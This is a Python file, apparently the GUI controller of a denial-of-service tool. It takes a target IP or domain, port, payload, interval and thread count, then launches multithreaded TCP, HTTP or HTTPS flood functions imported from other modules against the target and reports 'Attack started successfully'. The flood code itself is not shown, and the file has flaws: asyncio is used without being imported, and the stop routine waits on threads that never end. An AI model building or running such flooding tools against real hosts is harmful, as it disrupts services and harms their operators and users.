import tkinter as tk
from tkinter import messagebox
import threading
from Services.validations import *
from Types.http import *
from Types.https import *
from Types.tcp import *

attack_threads=[]


def start_attack(target, port, attack_type, payload, interval, num_threads):
    try:
        # Check for empty inputs
        if not all([target, port, attack_type, payload, interval, num_threads]):
            raise ValueError("All fields must be filled out.")

        # Validate port
        port = validate_port(port)

        # Validate interval
        interval = validate_positive_float(interval)

        # Validate number of threads
        num_threads = validate_positive_integer(num_threads)

        # Validate target (IP or domain)
        if not validate_ip(target) and not validate_domain(target):
            raise ValueError("Invalid IP address or domain format.")

        # Start attack based on type
        for _ in range(num_threads):
            if attack_type == 'TCP':
                thread = threading.Thread(target=send_tcp_flood, args=(target, port, payload.encode(), interval))
            elif attack_type == 'HTTP':
                thread = threading.Thread(target=asyncio.run, args=(send_async_http_flood(target, port, payload.encode(), interval),))
            elif attack_type == 'HTTPS':
                thread = threading.Thread(target=asyncio.run, args=(send_async_https_flood(target, port, payload.encode(), interval),))
            attack_threads.append(thread)
            thread.start()

        messagebox.showinfo("Success", "Attack started successfully!")

    except ValueError as ve:
        messagebox.showerror("Input Error", str(ve))
    except KeyboardInterrupt:
        print("\nEXITING FIREWALL.....")
        exit(1)
    except Exception as e:
        messagebox.showerror("Error", f"An unexpected error occurred: {e}")

# Function to stop the attack
def stop_attack():
    global attack_threads
    for thread in attack_threads:
        if thread.is_alive():
            thread.join()  # Wait for the thread to complete
    attack_threads = []
    messagebox.showinfo("Stopped", "All attacks have been stopped.")
    exit(1)
